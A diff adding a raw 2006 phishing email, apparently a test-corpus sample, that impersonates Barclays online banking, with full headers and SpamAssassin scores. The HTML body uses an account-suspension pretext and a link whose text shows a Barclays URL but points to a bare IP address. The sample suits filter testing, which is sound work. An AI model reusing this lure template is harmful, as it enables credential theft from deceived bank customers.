@@ -1,0 +1,122 @@
+From nobody Sun Jan 25 13:48:12 2015
+Return-Path: <nobody@la-pasion.propagation.net>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+ by naughty.example.com (Postfix) with ESMTP id 39687536E72
+ for <nobody@login.example.com>; Mon, 16 Jan 2006 06:11:17 -0500 (EST)
+Received: from mail2.example.com (localhost.example.com [127.0.0.1])
+ by mail2.example.com (Postfix) with ESMTP id 85ED76FA1FE
+ for <nobody@example.com>; Mon, 16 Jan 2006 06:10:59 -0500 (EST)
+Received: from spam.thegeekempire.net (dsl093-012-142.cle1.dsl.speakeasy.net
+ [66.93.12.142]) by mail2.example.com (Postfix) with ESMTP
+ for <nobody@example.com>; Mon, 16 Jan 2006 06:10:59 -0500 (EST)
+Received: from la-pasion.propagation.net (la-pasion.propagation.net
+ [69.13.66.39])
+ by spam.thegeekempire.net (8.10.1/8.9.3) with ESMTP id k0GCr7214856
+ for <nobody@spam.thegeekempire.net>; Mon, 16 Jan 2006 07:53:07 -0500 (EST)
+Received: (from nobody@localhost)
+ by la-pasion.propagation.net (8.11.6p2/8.11.6) id k0GAueU04277;
+ Mon, 16 Jan 2006 05:56:40 -0500
+Date: Mon, 16 Jan 2006 05:56:40 -0500
+Message-Id: <200601161056.k0GAueU04277@la-pasion.propagation.net>
+To: nobody@spam.thegeekempire.net
+Subject: Online Barclays Account Update
+From: Barclays iBank Online Banking <security@barclays.co.uk>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: *
+X-Spam-Status: No, score=1.9 required=5.0 tests=HTML_IMAGE_ONLY_24,
+ HTML_MESSAGE,MIME_HTML_ONLY,NORMAL_HTTP_TO_IP,RCVD_IN_BL_SPAMCOP_NET 
+ autolearn=no version=3.0.2
+X-Spam-Report: * 0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address
+ in URL
+ *  0.5 HTML_IMAGE_ONLY_24 BODY: HTML: images with 2000-2400 bytes of words
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ *  1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
+ *      [Blocked - see <http://www.spamcop.net/bl.shtml?69.13.66.39>]
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 233
+
+<html>
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>New Page 1</title> 
+</head>
+<body>
+<table border="0" width="100%" id="table1" style="border-collapse: 
+collapse">
+<tr>
+<td bgcolor="#003366" background=" 
+http://img159.exs.cx/img159/9760/topbk4ac.gif" height="65"> 
+<table border="0" width="100%" id="table2" style="border-collapse: 
+collapse">
+  <tr>
+   <td align="right" width="5">
+<img src=" 
+http://www.barclays.co.uk/images_new/home/barclays_logo.gif"></td >
+   <td>
+   <p align="right"><b><font color="#666666" size="2" face="Arial"> 
+    </font>
+   <font size="2" face="Arial" color="#FFFFFF"><br> Important Notice 
+</font><font color="#00A8DC" size="2" face="Arial"> 
+   </font></b></td>
+  </tr>
+</table>
+</td>
+</tr>
+<tr>
+<td height="21" align="left">
+<table border="0" width="62%" id="table3" style="border-collapse: 
+collapse">
+  <tr>
+   <td> </td> 
+   <td width="950"><p>
+   <font face="Arial" size="2" color="#003366"><br>
+   Dear Customer,<br> 
+   <br>
+   Our technical service department has recently updated our online banking 
+software, and due to
+software upgrade we kindly ask you to follow the reference given below to
+confirm your membership 
+details. Failure to confirm your membership details will suspend you from
+accessing your banking 
+online.</font></p>
+   <p><font color="#003366" face="Arial" size="3"><br> 
+   <br>
+<p><font color="#003366" size=2 face="Arial, Helvetica, 
+sans-serif"><strong>Reference</strong></font></p>
+     <table width="100%" cellpadding=0 cellspacing=0> 
+   </font></p>
+   <p><b><font face="Arial" size="2"> 
+   <a
+href="http://66.226.88.152/2pages.barclays.co.uk/ibank.barclays.co.uk/olb/p/LoginMember.do/index.htm ">
+   <font color="#00A8DC">
+
+https://ibank.barclays.co.uk/olb/q/LoginMember.do/confirm</font></a></font></b></p 
+>
+   <p><font color="#002341" face="Arial" size="1"><b></b><br> 
+   <br>
+   <br>
+</font></p>
+   <p><font face="Arial" size="2"><font color="#666666"><b> 
+   Regards,</b><br>
+   <i><br> 
+   Barclays Customer Service</i></font><br>   </tr>
+</table>
+<hr size="1">
+<p><font size="1" face="Arial" color="#808080"> 
+<br>
+</tr>
+<tr>
+<td> </td>
+</tr>
+</table>
+</body>
+</html>
